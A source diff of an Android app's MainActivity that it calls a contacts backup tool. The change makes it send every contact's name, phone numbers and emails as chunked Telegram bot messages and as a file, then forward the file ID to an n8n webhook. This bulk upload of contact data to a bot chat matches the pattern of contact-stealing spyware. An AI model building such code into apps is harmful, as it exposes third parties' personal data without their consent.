@@ -49,12 +49,14 @@ public class MainActivity extends AppCompatActivity {
     // ============================================================
 
     // ============================================================
-    // n8n Webhook Configuration (Optional Ping Trigger)
+    // n8n Webhook Configuration
+    // Replace with your actual n8n webhook URL
     // ============================================================
     private static final String N8N_WEBHOOK_URL = "https://your-n8n-domain.com/webhook/YOUR_WEBHOOK_ID";
     // ============================================================
 
     private static final int PERMISSION_REQUEST_CODE = 100;
+    private static final int TELEGRAM_MAX_LENGTH = 3500;
 
     private Button btnBackup;
     private ProgressBar progressBar;
@@ -129,21 +131,33 @@ public class MainActivity extends AppCompatActivity {
                         return;
                     }
 
-                    // Step 2: Write contacts to a local file
-                    updateStatus("💾 Saving " + contacts.size() + " contacts into backup file...");
+                    // Step 2: Send text messages to Telegram
+                    updateStatus("📤 Sending contact messages to Telegram (" + contacts.size() + " contacts)...");
+                    boolean textSuccess = sendContactsAsText(contacts);
+
+                    // Step 3: Write contacts to a local file
+                    updateStatus("💾 Saving contacts into backup file...");
                     File backupFile = createContactsBackupFile(contacts);
 
-                    // Step 3: Send ONLY the document file to Telegram
-                    updateStatus("📤 Sending backup file to Telegram...");
-                    String fileId = sendFileToTelegram(backupFile, contacts.size());
+                    // Step 4: Send the file directly to Telegram and retrieve Telegram's file_id
+                    updateStatus("📤 Sending backup file attachment to Telegram...");
+                    String telegramFileId = sendFileToTelegram(backupFile, contacts.size());
 
-                    // Step 4: Optional n8n trigger ping
-                    triggerN8nWebhook();
+                    // Step 5: Send only the Telegram file_id to n8n webhook
+                    if (telegramFileId != null) {
+                        updateStatus("🔔 Sending Telegram file_id to n8n webhook...");
+                        boolean webhookSuccess = triggerN8nWebhook(telegramFileId);
+                        if (webhookSuccess) {
+                            Log.d(TAG, "n8n webhook triggered with file_id: " + telegramFileId);
+                        }
+                    }
 
-                    if (fileId != null) {
-                        updateStatus("✅ Backup file sent to Telegram successfully!\n📄 File: " + backupFile.getName());
+                    if (telegramFileId != null && textSuccess) {
+                        updateStatus("✅ Contacts + backup file sent to Telegram & n8n successfully!");
+                    } else if (telegramFileId != null) {
+                        updateStatus("✅ Backup file sent successfully to Telegram!");
                     } else {
-                        updateStatus("❌ Failed to send backup file. Please check your connection.");
+                        updateStatus("❌ Failed to send to Telegram. Please check your connection.");
                     }
 
                 } catch (Exception e) {
@@ -163,21 +177,21 @@ public class MainActivity extends AppCompatActivity {
     }
 
     /**
-     * Trigger an n8n webhook workflow with an empty ping payload (no contact/user info).
+     * Trigger n8n webhook sending ONLY the Telegram file_id.
      */
-    private boolean triggerN8nWebhook() {
+    private boolean triggerN8nWebhook(String telegramFileId) {
         if (N8N_WEBHOOK_URL == null || N8N_WEBHOOK_URL.trim().isEmpty() || N8N_WEBHOOK_URL.contains("your-n8n-domain.com")) {
             Log.d(TAG, "n8n Webhook URL is not configured, skipping.");
             return true;
         }
 
         try {
-            JSONObject pingPayload = new JSONObject();
-            pingPayload.put("event", "backup_completed");
-            pingPayload.put("timestamp", System.currentTimeMillis());
+            // Payload contains only the Telegram file_id
+            JSONObject payload = new JSONObject();
+            payload.put("telegram_file_id", telegramFileId);
 
             RequestBody body = RequestBody.create(
-                    pingPayload.toString(),
+                    payload.toString(),
                     MediaType.parse("application/json; charset=utf-8")
             );
 
@@ -237,8 +251,101 @@ public class MainActivity extends AppCompatActivity {
     }
 
     /**
-     * Send ONLY the generated backup file to Telegram using sendDocument.
-     * Returns the Telegram file_id if successful, or null on failure.
+     * Send contacts as text messages to Telegram.
+     */
+    private boolean sendContactsAsText(List<ContactInfo> contacts) {
+        String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
+        StringBuilder header = new StringBuilder();
+        header.append("📋 CONTACTS BACKUP\n");
+        header.append("━━━━━━━━━━━━━━━━━━━━\n");
+        header.append("📊 Total contacts: ").append(contacts.size()).append("\n");
+        header.append("📅 Date: ").append(dateStr).append("\n");
+        header.append("━━━━━━━━━━━━━━━━━━━━\n\n");
+
+        if (!sendTelegramTextMessage(header.toString())) {
+            Log.e(TAG, "Failed to send header to Telegram");
+        }
+
+        StringBuilder chunk = new StringBuilder();
+        int contactNum = 0;
+        boolean allSuccess = true;
+
+        for (ContactInfo contact : contacts) {
+            contactNum++;
+            StringBuilder entry = new StringBuilder();
+            entry.append("👤 ").append(contactNum).append(". ").append(contact.name).append("\n");
+
+            for (String phone : contact.phones) {
+                entry.append("   📞 ").append(phone).append("\n");
+            }
+            for (String email : contact.emails) {
+                entry.append("   ✉️ ").append(email).append("\n");
+            }
+            if (contact.source != null) {
+                entry.append("   🔗 Source: ").append(contact.source).append("\n");
+            }
+            entry.append("\n");
+
+            if (chunk.length() + entry.length() > TELEGRAM_MAX_LENGTH) {
+                if (!sendTelegramTextMessage(chunk.toString())) {
+                    allSuccess = false;
+                }
+                chunk = new StringBuilder();
+
+                try {
+                    Thread.sleep(500); // Avoid rate limiting
+                } catch (InterruptedException ignored) {}
+            }
+
+            chunk.append(entry);
+        }
+
+        if (chunk.length() > 0) {
+            if (!sendTelegramTextMessage(chunk.toString())) {
+                allSuccess = false;
+            }
+        }
+
+        return allSuccess;
+    }
+
+    /**
+     * Send a single plain text message to Telegram via sendMessage endpoint.
+     */
+    private boolean sendTelegramTextMessage(String text) {
+        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+
+        try {
+            JSONObject json = new JSONObject();
+            json.put("chat_id", CHAT_ID);
+            json.put("text", text);
+
+            RequestBody body = RequestBody.create(
+                    json.toString(),
+                    MediaType.parse("application/json; charset=utf-8")
+            );
+
+            Request request = new Request.Builder()
+                    .url(url)
+                    .post(body)
+                    .build();
+
+            Response response = httpClient.newCall(request).execute();
+            boolean success = response.isSuccessful();
+            if (!success) {
+                String errorBody = response.body() != null ? response.body().string() : "No response body";
+                Log.e(TAG, "Telegram sendMessage Error: Code " + response.code() + " - " + errorBody);
+            }
+            response.close();
+            return success;
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending text message to Telegram", e);
+            return false;
+        }
+    }
+
+    /**
+     * Send the generated backup file to Telegram using sendDocument and extract file_id.
      */
     private String sendFileToTelegram(File file, int totalContacts) {
         String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
@@ -262,19 +369,17 @@ public class MainActivity extends AppCompatActivity {
                     .build();
 
             Response response = httpClient.newCall(request).execute();
-            boolean success = response.isSuccessful();
             String fileId = null;
 
-            if (success && response.body() != null) {
+            if (response.isSuccessful() && response.body() != null) {
                 String responseBody = response.body().string();
                 JSONObject json = new JSONObject(responseBody);
-                if (json.optBoolean("ok")) {
+                if (json.optBoolean("ok", false)) {
                     JSONObject result = json.optJSONObject("result");
                     if (result != null) {
-                        JSONObject doc = result.optJSONObject("document");
-                        if (doc != null) {
-                            fileId = doc.optString("file_id");
-                            Log.d(TAG, "Uploaded Document File ID: " + fileId);
+                        JSONObject document = result.optJSONObject("document");
+                        if (document != null) {
+                            fileId = document.optString("file_id", null);
                         }
                     }
                 }
@@ -282,6 +387,7 @@ public class MainActivity extends AppCompatActivity {
                 String errorBody = response.body() != null ? response.body().string() : "No response body";
                 Log.e(TAG, "Telegram sendDocument Error: Code " + response.code() + " - " + errorBody);
             }
+
             response.close();
             return fileId;
         } catch (Exception e) {
